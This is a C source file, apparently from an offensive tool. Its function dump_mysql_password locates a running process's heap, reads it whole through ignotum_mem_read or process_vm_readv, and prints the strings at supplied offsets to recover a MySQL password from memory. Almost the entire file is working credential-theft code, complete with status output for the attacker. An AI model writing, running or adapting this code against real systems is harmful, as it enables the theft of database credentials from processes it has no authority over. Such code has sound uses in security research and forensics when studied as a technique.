#define _GNU_SOURCE

#include <ignotum.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/uio.h>

#include "dump-password.h"
#include "globals.h"
#include "heap.h"

ssize_t (*memreadfunc)(pid_t, void *, size_t, off_t) = ignotum_mem_read;

void dump_mysql_password(pid_t pid, off_t *offset){
    ignotum_mapinfo_t heap;
    size_t len, aux;
    ssize_t n;

    printf("[*] getting heap address of pid %d\n", pid);
    if(getheapmap(pid, &heap)){
        printf("[-] failed to find the heap address\n");
        return;
    }

    printf("[+] heap = %lx-%lx\n", heap.start_addr, heap.end_addr);

    len = heap.end_addr - heap.start_addr;
    char *dump = malloc(heap.end_addr - heap.start_addr);
    if(dump == NULL){
        printf("malloc failed\n");
        return;
    }

    n = memreadfunc(pid, dump, len, heap.start_addr);
    printf("[+] %zd bytes read of %zu\n", n, len);
    if(n <= 0){
        free(dump);
        return;
    }

    while((aux = *offset++)){
        if(aux >= (size_t)n){
            printf("[-] skipping offset 0x%lx, out of bounds\n", aux);
            continue;
        }

        printf("[+] string at offset 0x%lx: %s\n", aux, dump+aux);
    }

    free(dump);
}

ssize_t xprocess_vm_readv(pid_t pid, void *out, size_t len, off_t addr){
    return process_vm_readv(pid,
        &(struct iovec){ .iov_base = out, .iov_len = len }, 1,
        &(struct iovec){ .iov_base = (void*)addr, .iov_len = len }, 1, 0);
}
